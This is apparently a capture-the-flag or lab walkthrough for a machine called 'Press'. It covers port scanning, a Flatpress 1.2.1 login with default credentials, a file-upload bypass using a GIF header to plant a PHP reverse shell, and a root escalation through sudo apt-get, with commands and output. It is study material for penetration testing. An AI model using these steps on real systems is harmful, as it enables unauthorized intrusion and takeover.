# Press

## Enumeration & scanning

- Open ports are 22, 80, and 8089.
- Port 80 displays static website with no special content.
- Port 8089 displays Flatpress blog webapp with login functionality. Version is 1.2.1.

``` sh
# Default scanning
sudo nmap -p- 192.168.187.29
sudo nmap -p 80,8089 -A 192.168.187.29
nuclei -target 192.168.187.29
nuclei -target 192.168.187.29:8089
feroxbuster --url http://192.168.187.29
feroxbuster --url http://192.168.187.29:8089
```

## Exploitation

- Flatpress version contains authenticated file upload [vulnerability](https://github.com/flatpressblog/flatpress/issues/152) and directory traversal [vulnerability](https://huntr.com/bounties/4ca6d3c1-b3cf-4c64-b8ea-4977a474d725).
- Can browse to folder that contains users, but cannot open the `.php` files (likely blocked somehow): http://192.168.187.29:8089/fp-content/users/admin.php
- However, it does prove that the user `admin` exists.
- We can login with `admin:password` credentials.
- We can apply the file upload exploit and upload php reverse shell with the GIF magic header `GIF89a;` on the first line to get around filtering.
- We catch the shell and have RCE for the `www-data` user.
- No local flag for this challenge.

## Privilege Escalation

- The `www-data` user can execute `apt-get` with sudo permissions.
- Leverage GFTObins command to get root.

``` sh
# Check sudoers file
sudo -l
# Use apt-get GTFObins command to get root
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# Get flag
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
email8.txt  proof.txt
cat proof.txt
d8152836cdcbc18efc888fe1a6cbc503

```

## References

- https://www.exploit-db.com/exploits/51997
- https://github.com/flatpressblog/flatpress/issues/152
- https://huntr.com/bounties/4ca6d3c1-b3cf-4c64-b8ea-4977a474d725
- https://gtfobins.org/gtfobins/apt-get/

## Rabbit holes

- Tried brute forcing login panel with FFUF and Hydra. Learned about multipart forms and that Hydra can't deal with them.
- Could pivot to `offsec` user with password `lab`, but nothing to be found there.
- There was a MariaDB server hosted locally but couldn't login without password and `root` account.
